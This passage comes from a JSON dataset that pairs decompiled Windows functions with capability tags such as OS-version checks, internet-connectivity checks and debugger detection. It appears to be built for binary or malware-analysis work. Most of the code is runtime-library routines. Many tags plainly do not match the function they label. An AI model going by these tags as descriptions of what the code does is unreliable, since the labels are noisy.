2;\n                        param_1[0xb] = 0xb;\n                        param_1[4] = puVar6;\n                    }\n                    else if (((((puVar6 == 0x64) || (puVar6 == 0x69)) || (puVar6 == 0x6f)) ||\n                             ((puVar6 == 0x75 || (puVar6 == 0x78)))) || (puVar6 == 0x58)) {\n                        param_1[0xb] = 9;\n                    }\n                }\n                else if (puVar6 == 0x4c) {\n                    param_1[0xb] = 8;\n                }\n                else if (puVar6 == 0x54) {\n                    param_1[0xb] = 0xd;\n                }\n                else if (puVar6 == 0x68) {\n                    puVar6 = param_1[4];\n                    if (*puVar6 == 0x68) {\n                        puVar6 = puVar6 + 1;\n                        param_1[0xb] = 1;\n                        param_1[4] = puVar6;\n                    }\n                    else {\n                        param_1[0xb] = 2;\n                    }\n                }\n            }\n            else if (puVar6 == 0x6c) {\n                puVar6 = param_1[4];\n                if (*puVar6 == 0x6c) {\n                    puVar6 = puVar6 + 1;\n                    param_1[0xb] = 4;\n                    param_1[4] = puVar6;\n                }\n                else {\n                    param_1[0xb] = 3;\n                }\n            }\n            else if (puVar6 == 0x74) {\n                param_1[0xb] = 7;\n            }\n            else if (puVar6 == 0x77) {\n                param_1[0xb] = 0xc;\n            }\n            else if (puVar6 == 0x7a) {\n                param_1[0xb] = 6;\n            }\n        }\ncode_r0x0040619e:\n        return CONCAT31(puVar6 >> 8, 1);\n    }\n    puVar6 = *param_1 & 8;\n    if (puVar6 != NULL) goto code_r0x0040619e;\n    param_1[7] = 7;\n    uStack8 = *0x41c004 ^ &stack0xfffffffc;\n    uVar9 = *(param_1 + 0x32);\n    if (uVar9 < 0x65) {\n        if (uVar9 == 100) {\ncode_r0x00406260:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x00406264:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x00406267:\n            cVar5 = fcn.004066f3(arg_8h, arg_ch_00);\n        }\n        else if (uVar9 < 0x59) {\n            if (uVar9 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x0040620c:\n                arg_8h = 0x10;\n                goto code_r0x00406267;\n            }\n            if (uVar9 != 0x41) {\n                if (uVar9 == 0x43) goto code_r0x00406220;\n                if (uVar9 < 0x45) goto code_r0x004063ee;\n                if (0x47 < uVar9) {\n                    if (uVar9 != 0x53) goto code_r0x004063ee;\n                    goto code_r0x004061f4;\n                }\n            }\ncode_r0x00406270:\n            cVar5 = fcn.004064e9();\n        }\n        else if (uVar9 == 0x5a) {\n            cVar5 = fcn.00406486();\n        }\n        else {\n            if (uVar9 == 0x61) goto code_r0x00406270;\n            if (uVar9 != 99) goto code_r0x004063ee;\ncode_r0x00406220:\n            cVar5 = fcn.0040665b(0);\n        }\n    }\n    else if (uVar9 < 0x71) {\n        if (uVar9 == 0x70) {\n            cVar5 = fcn.004068d0();\n        }\n        else {\n            if (uVar9 < 0x68) goto code_r0x00406270;\n            if (uVar9 == 0x69) goto code_r0x00406260;\n            if (uVar9 == 0x6e) {\n                cVar5 = fcn.0040683d();\n            }\n            else {\n                if (uVar9 != 0x6f) goto code_r0x004063ee;\n                cVar5 = fcn.004068b1();\n            }\n        }\n    }\n    else {\n        if (uVar9 != 0x73) {\n            if (uVar9 != 0x75) {\n                if (uVar9 != 0x78) goto code_r0x004063ee;\n                arg_ch_00 = 0;\n                goto code_r0x0040620c;\n            }\n            goto code_r0x00406264;\n        }\ncode_r0x004061f4:\n        cVar5 = fcn.004068e8();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0xc) != '\\0')) goto code_r0x004063ee;\n    uVar8 = param_1[8];\n    uStack16 = 0;\n    uStack12 = 0;\n    arg_ch = 0;\n    if ((uVar8 >> 4 & 1) != 0) {\n        if ((uVar8 >> 6 & 1) == 0) {\n            if ((uVar8 & 1) == 0) {\n                if ((uVar8 >> 1 & 1) != 0) {\n                    uStack16 = 0x20;\n                    arg_ch = 1;\n                }\n                goto code_r0x004062ee;\n            }\n            uVar9 = 0x2b;\n        }\n        else {\n            uVar9 = 0x2d;\n        }\n        uStack16 = uVar9;\n        arg_ch = 1;\n    }\ncode_r0x004062ee:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar8 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&uStack16 + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (iVar1 == 0x41)) {\n            bVar3 = true;\n        }\n        else {\n            bVar3 = false;\n        }\n        *(&uStack16 + arg_ch * 2 + 2) = (!bVar3 - 1U & 0xe0) + 0x78;\n        arg_ch = arg_ch + 2;\n    }\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((uVar8 & 0xc) == 0) {\n        fcn.00405b71(param_1 + 0x112, 0x20, arg_10h, param_1 + 6);\n    }\n    fcn.00406a87(&uStack16, arg_ch, param_1 + 6, param_1[3]);\n    arg_14h = param_1 + 6;\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00405b71(param_1 + 0x112, 0x30, arg_10h, arg_14h);\n    }\n    fcn.004069fc(0);\n    if ((-1 < *arg_14h) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00405b71(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n    }\ncode_r0x004063ee:\n    uVar8 = fcn.004033b0(unaff_ESI);\n    return uVar8;\n}\n",
        "token_count": 2489
    },
    "004066f3": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004066f3(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    int32_t in_ECX;\n    uint32_t arg_ch_00;\n    bool bVar5;\n    \n    iVar1 = fcn.0040642a(*(in_ECX + 0x2c));\n    if (iVar1 == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 4) {\n            if (iVar1 != 8) {\n                puVar2 = fcn.00409404();\n                *puVar2 = 0x16;\n                uVar3 = fcn.00406dd6();\n                return uVar3 & 0xffffff00;\n            }\n            *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n            uVar3 = *(*(in_ECX + 0x14) + -8);\n            arg_ch_00 = *(*(in_ECX + 0x14) + -4);\n            goto code_r0x004067a4;\n        }\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n            arg_ch_00 = 0;\n            goto code_r0x004067a4;\n        }\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    arg_ch_00 = uVar3 >> 0x1f;\ncode_r0x004067a4:\n    if ((((*(in_ECX + 0x20) >> 4 & 1) != 0) && (arg_ch_00 < 1)) && (arg_ch_00 < 0)) {\n        bVar5 = uVar3 != 0;\n        uVar3 = -uVar3;\n        arg_ch_00 = -(arg_ch_00 + bVar5);\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) | 0x40;\n    }\n    if (*(in_ECX + 0x28) < 0) {\n        *(in_ECX + 0x28) = 1;\n    }\n    else {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xfffffff7;\n        if (0x200 < *(in_ECX + 0x28)) {\n            *(in_ECX + 0x28) = 0x200;\n        }\n    }\n    if ((uVar3 | arg_ch_00) == 0) {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n    }\n    if (iVar1 == 8) {\n        fcn.00405ae9(uVar3, arg_ch_00, arg_8h, arg_ch);\n    }\n    else {\n        fcn.00405a74(uVar3, arg_8h, arg_ch);\n    }\n    pcVar4 = *(in_ECX + 0x20) >> 7;\n    if (((pcVar4 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (pcVar4 = *(in_ECX + 0x34),  *pcVar4 != '0')))) {\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        **(in_ECX + 0x34) = 0x30;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n    }\n    return CONCAT31(pcVar4 >> 8, 1);\n}\n",
        "token_count": 1101
    },
    "00408f34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408f34(uint param_1, uint param_2)\n\n{\n    uint unaff_EBX;\n    uint in_stack_fffffd2c;\n    uint in_stack_fffffd30;\n    uint var_2c8h;\n    \n    fcn.004070f9(param_2, param_1);\n    fcn.0040dba0();\n    fcn.00408fbf(unaff_EBX, in_stack_fffffd2c, in_stack_fffffd30);\n    return;\n}\n",
        "token_count": 115
    },
    "0040cb98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040cb98(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1dh;\n    \n    if (*(unaff_EBP + -0x1d) != '\\0') {\n        fcn.0040aa47(3);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "004118ae": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.004118ae(double param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint arg_14h;\n    double dVar6;\n    double dVar7;\n    uchar in_XMM0 [16];\n    double dVar8;\n    double dVar9;\n    double dVar10;\n    double dVar11;\n    double dStack12;\n    \n    iVar4 = 0;\n    while( true ) {\n        uVar2 = SUB162(in_XMM0 >> 0x30, 0) >> 4;\n        dVar6 = SUB168(in_XMM0, 0) & *0x418e70 | *0x418ee0;\n        dVar7 = SUB168(in_XMM0, 0) & *0x418e78 | *0x418ee8;\n        uVar1 = SUB82(*0x418e90 + dVar6, 0) & 0x7f0;\n        dVar11 = *0x418ea8 & dVar7;\n        dVar9 = (*0x418ea0 & dVar6) * *(uVar1 + 0x419430) - *0x418e80;\n        dVar6 = (dVar6 - (*0x418ea0 & dVar6)) * *(uVar1 + 0x419430);\n        dVar8 = (dVar7 - dVar11) * *(uVar1 + 0x419438);\n        dVar7 = dVar6 + dVar9;\n        dVar11 = dVar8 + (dVar11 * *(uVar1 + 0x419438) - *0x418e88);\n        uVar3 = uVar2 - 1;\n        if (uVar3 < 0x7fe) {\n            iVar4 = (uVar2 - 0x3ff) + iVar4;\n            dVar10 = iVar4;\n            iVar5 = 0;\n            if (uVar1 + iVar4 * 0x400 == 0) {\n                iVar5 = 0x10;\n            }\n            return ((*0x418f38 * dVar11 + *0x418f48) * dVar11 + *0x418f58) * dVar11 * dVar11 +\n                   ((*0x418f30 * dVar7 + *0x418f40) * dVar7 + *0x418f50) * dVar7 * dVar7 * dVar7 * dVar7 * dVar7 +\n                   *0x418f60 * dVar7 + *(uVar1 + 0x419028) + dVar10 * *0x418eb8 + (dVar8 & *(iVar5 + 0x418ec8)) +\n                   *(uVar1 + 0x419020) + dVar9 + dVar10 * *0x418eb0 + (dVar6 & *(iVar5 + 0x418ec0));\n        }\n        dStack12 = -(*0x418ef0 == param_1);\n        if (SUB82(dStack12, 0) != 0) break;\n        if (uVar3 != 0xffffffff) {\n            if (uVar3 < 0x7ff) {\n                if (*0x418ee0 == (param_1 & *0x418e70 | *0x418ee0)) {\n                    return *0x418f18;\n                }\n                arg_14h = 0x3e9;\n                dStack12 = *0x418e70;\n            }\n            else if (((uVar2 & 0x7ff) < 0x7ff) || ((SUB84(param_1, 0) | param_1 >> 0x20 & 0xfffff) == 0)) {\n                dStack12 = -NAN;\n                arg_14h = 9;\n            }\n            else {\n                arg_14h = 0x3e9;\n            }\n            goto code_r0x00411aba;\n        }\n        in_XMM0 = CONCAT88(dVar11, param_1 * *0x418f00);\n        iVar4 = -0x34;\n    }\n    arg_14h = 8;\n    dStack12 = *0x418f10;\ncode_r0x00411aba:\n    fcn.00408b52(&param_1, &param_1, &dStack12, arg_14h);\n    return dStack12;\n}\n",
        "token_count": 1004
    },
    "004132dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004132dc(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t *unaff_EDI;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_1ch;\n    \n    *(unaff_EBX + -4) = *(unaff_EBP + -0x2c);\n    fcn.00412f08(*(unaff_EBP + -0x30));\n    iVar1 = fcn.0040512c();\n    *(iVar1 + 0x10) = *(unaff_EBP + -0x34);\n    iVar1 = fcn.0040512c();\n    *(iVar1 + 0x14) = *(unaff_EBP + -0x38);\n    if (((((*unaff_EDI == -0x1f928c9d) && (unaff_EDI[4] == 3)) &&\n         ((unaff_EDI[5] == 0x19930520 || ((unaff_EDI[5] == 0x19930521 || (unaff_EDI[5] == 0x19930522)))))) &&\n        (*(unaff_EBP + -0x3c) == 0)) &&\n       ((*(unaff_EBP + -0x1c) != 0 && (iVar1 = fcn.00412f52(unaff_EDI[6]),  iVar1 != 0)))) {\n        fcn.0041309c(unaff_EDI);\n    }\n    return;\n}\n",
        "token_count": 371
    },
    "00413bf6": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00413bf6(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00403e20(0x41a6c0, 0x10);\n    if (*(*(unaff_EBP + 0x10) + 4) < 0x81) {\n        iVar4 = *(*(unaff_EBP + 8) + 8);\n    }\n    else {\n        iVar4 = *(*(unaff_EBP + 8) + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar4;\n    iVar3 = fcn.0040512c();\n    *(iVar3 + 0x18) = *(iVar3 + 0x18) + 1;\n    *(unaff_EBP + -4) = 0;\n    while( true ) {\n        if (iVar4 == *(unaff_EBP + 0x14)) goto code_r0x00413c8a;\n        if ((iVar4 < 0) || (iVar3 = *(unaff_EBP + 0x10),  *(iVar3 + 4) <= iVar4)) break;\n        iVar1 = *(iVar3 + 8);\n        uVar2 = *(iVar1 + iVar4 * 8);\n        *(unaff_EBP + -0x20) = uVar2;\n        *(unaff_EBP + -4) = 1;\n        if (*(iVar1 + 4 + iVar4 * 8) != 0) {\n            iVar1 = *(unaff_EBP + 8);\n            *(iVar1 + 8) = uVar2;\n            fcn.00413050(*(*(iVar3 + 8) + 4 + iVar4 * 8), iVar1, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        iVar4 = *(unaff_EBP + -0x20);\n        *(unaff_EBP + -0x1c) = iVar4;\n    }\n    do {\n        fcn.004081d8();\ncode_r0x00413c8a:\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.00413caa();\n    } while (iVar4 != *(unaff_EBP + 0x14));\n    *(*(unaff_EBP + 8) + 8) = iVar4;\n    fcn.00403e66();\n    return;\n}\n",
        "token_count": 622
    },
    "00413caa": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00413caa(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040512c();\n    if (0 < *(iVar1 + 0x18)) {\n        iVar1 = fcn.0040512c();\n        *(iVar1 + 0x18) = *(iVar1 + 0x18) + -1;\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "00402c45": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402c45(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint unaff_ESI;\n    uint32_t arg_8h_2;\n    uint unaff_EDI;\n    \n    if ((param_1[2] - param_1[1]) / 0x18 == 0) {\n        iVar2 = (param_1[1] - *param_1) / 0x18;\n        if (iVar2 == 0xaaaaaaa) {\n            fcn.00403363(\"vector<T> too long\");\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        arg_8h_2 = iVar2 + 1;\n        uVar3 = (param_1[2] - *param_1) / 0x18;\n        uVar4 = 0;\n        if (uVar3 <= 0xaaaaaaa - (uVar3 >> 1)) {\n            uVar4 = (uVar3 >> 1) + uVar3;\n        }\n        if (arg_8h_2 <= uVar4) {\n            arg_8h_2 = uVar4;\n        }\n        fcn.00402e40(arg_8h_2, unaff_EDI, unaff_ESI);\n    }\n    return;\n}\n",
        "token_count": 321
    },
    "00405e65": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405e65(int32_t param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    cVar2 = fcn.0040699c();\n    if (cVar2 == '\\0') {\n        return 0xffffffff;\n    }\n    if (*(param_1 + 0x10) == 0) {\ncode_r0x00405e8a:\n        puVar3 = fcn.00409404();\n        *puVar3 = 0x16;\n        fcn.00406dd6();\ncode_r0x00405e9a:\n        uVar4 = 0xffffffff;\n    }\n    else {\ncode_r0x00405f4a:\n        *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n        if (*(param_1 + 0x450) != 2) {\n            *(param_1 + 0x38) = 0;\n            *(param_1 + 0x1c) = 0;\ncode_r0x00405f33:\n            iVar1 = **(param_1 + 0x10);\n            *(param_1 + 0x32) = iVar1;\n            if (iVar1 != 0) {\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n                if (*(param_1 + 0x18) < 0) goto code_r0x00405f4a;\n                uVar4 = fcn.00405d77(*(param_1 + 0x32), *(param_1 + 0x1c));\n                *(param_1 + 0x1c) = uVar4;\n    // switch table (8 cases) at 0x405f65\n                switch(uVar4) {\n                case 0:\n                    cVar2 = fcn.00405fc2();\n                    break;\n                case 1:\n                    *(param_1 + 0x28) = 0xffffffff;\n                    *(param_1 + 0x24) = 0;\n                    *(param_1 + 0x30) = 0;\n                    *(param_1 + 0x20) = 0;\n                    *(param_1 + 0x2c) = 0;\n                    *(param_1 + 0x3c) = 0;\n                    goto code_r0x00405f33;\n                case 2:\n                    cVar2 = fcn.00405f85();\n                    break;\n                case 3:\n                    cVar2 = fcn.004063fe();\n                    break;\n                case 4:\n                    goto code_r0x00405f0d;\n                case 5:\n                    cVar2 = fcn.00405ffc();\n                    break;\n                case 6:\n                    cVar2 = fcn.00406025();\n                    break;\n                case 7:\n                    cVar2 = fcn.004061a1();\n                    break;\n                case 0xbad1abe1:\n                    goto code_r0x00405e9a;\n                default:\n                    goto code_r0x00405e8a;\n                }\n                if (cVar2 == '\\0') goto code_r0x00405e9a;\n                goto code_r0x00405f33;\n            }\n            *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n            goto code_r0x00405f4a;\n        }\n        uVar4 = *(param_1 + 0x18);\n    }\n    return uVar4;\ncode_r0x00405f0d:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x00405f33;\n}\n",
        "token_count": 842
    },
    "00403d6d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403d6d(int32_t **arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    \n    piVar1 = *arg_8h;\n    if (((*piVar1 == -0x1f928c9d) && (piVar1[4] == 3)) &&\n       ((iVar2 = piVar1[5],  iVar2 == 0x19930520 ||\n        (((iVar2 == 0x19930521 || (iVar2 == 0x19930522)) || (iVar2 == 0x1994000)))))) {\n        fcn.004081d8();\n        pcVar3 = swi(3);\n        uVar4 = (*pcVar3)();\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 196
    },
    "00402fa5": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00402fa5(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *extraout_ECX;\n    uint *puVar4;\n    int32_t unaff_EBP;\n    uint32_t uVar5;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00412c40(0x10);\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    uVar5 = *(unaff_EBP + 8) | 0xf;\n    if (uVar5 == 0xffffffff) {\n        uVar5 = *(unaff_EBP + 8);\n        puVar4 = extraout_ECX;\n    }\n    else {\n        uVar1 = extraout_ECX[5];\n        puVar4 = uVar1 >> 1;\n        *(unaff_EBP + -0x1c) = 3;\n        if (uVar5 / *(unaff_EBP + -0x1c) < puVar4) {\n            if (-puVar4 - 2U < uVar1) {\n                uVar5 = 0xfffffffe;\n            }\n            else {\n                uVar5 = puVar4 + uVar1;\n            }\n        }\n    }\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.00401006(puVar4);\n    *(unaff_EBP + -0x14) = uVar3;\n    *(unaff_EBP + -4) = 0xffffffff;\n    iVar2 = *(unaff_EBP + 0xc);\n    if (iVar2 != 0) {\n        puVar4 = extraout_ECX;\n        if (0xf < extraout_ECX[5]) {\n            puVar4 = *extraout_ECX;\n        }\n        if (iVar2 != 0) {\n            fcn.004045b0(uVar3, puVar4, iVar2);\n        }\n    }\n    fcn.00402cb1(1, 0);\n    if (extraout_ECX != NULL) {\n        *extraout_ECX = *(unaff_EBP + -0x14);\n    }\n    extraout_ECX[5] = uVar5;\n    extraout_ECX[4] = iVar2;\n    puVar4 = extraout_ECX;\n    if (0xf < extraout_ECX[5]) {\n        puVar4 = *extraout_ECX;\n    }\n    *(puVar4 + iVar2) = 0;\n    fcn.00412c2b();\n    return;\n}\n",
        "token_count": 617
    },
    "00410e4d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00410e4d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t lpCriticalSection;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00403e20(0x41a620, 0x14);\n    lpCriticalSection = *(unaff_EBP + 8);\n    if (lpCriticalSection == 0xfffffffe) {\n        puVar1 = fcn.004093f1();\n        *puVar1 = 0;\n        puVar1 = fcn.00409404();\n        *puVar1 = 9;\n    }\n    else {\n        if ((-1 < lpCriticalSection) && (lpCriticalSection < *0x41cff8)) {\n            iVar3 = (lpCriticalSection & 0x3f) * 0x30;\n            *(unaff_EBP + -0x20) = iVar3;\n            if ((*(*((lpCriticalSection >> 6) * 4 + 0x41cdf8) + 0x28 + iVar3) & 1) != 0) {\n                fcn.0040be41(lpCriticalSection);\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n                *(unaff_EBP + -4) = 0;\n                if ((*(*((lpCriticalSection >> 6) * 4 + 0x41cdf8) + 0x28 + *(unaff_EBP + -0x20)) & 1) == 0) {\n                    puVar1 = fcn.00409404();\n                    *puVar1 = 9;\n                    puVar1 = fcn.004093f1();\n                    *puVar1 = 0;\n                }\n                else {\n                    uVar2 = fcn.00410f38(lpCriticalSection, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar2;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00410f0f();\n                goto code_r0x00410f32;\n            }\n        }\n        puVar1 = fcn.004093f1();\n        *puVar1 = 0;\n        puVar1 = fcn.00409404();\n        *puVar1 = 9;\n        fcn.00406dd6();\n    }\ncode_r0x00410f32:\n    fcn.00403e66();\n    return;\n}\n",
        "token_count": 606
    },
    "004112d3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004112d3(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    uint uVar4;\n    uint unaff_retaddr;\n    uint var_1ch;\n    uint var_4h;\n    uint noname_1;\n    \n    noname_1 = 0xc;\n    fcn.00403e20();\n    uVar4 = 0;\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.0040be41(**(unaff_EBP + 8));\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = ***(unaff_EBP + 0xc);\n    if ((*(*((arg_8h_00 >> 6) * 4 + 0x41cdf8) + 0x28 + (arg_8h_00 & 0x3f) * 0x30) & 1) != 0) {\n        uVar1 = fcn.0040bf18(arg_8h_00);\n        iVar2 = (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(uVar1);\n        if (iVar2 != 0) goto code_r0x00411343;\n        puVar3 = fcn.004093f1();\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *puVar3 = uVar4;\n    }\n    puVar3 = fcn.00409404();\n    *puVar3 = 9;\n    uVar4 = 0xffffffff;\ncode_r0x00411343:\n    *(unaff_EBP + -0x1c) = uVar4;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0041135f(0x41a660, noname_1, unaff_retaddr);\n    fcn.00403e66();\n    return;\n}\n",
        "token_count": 478
    },
    "00412001": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
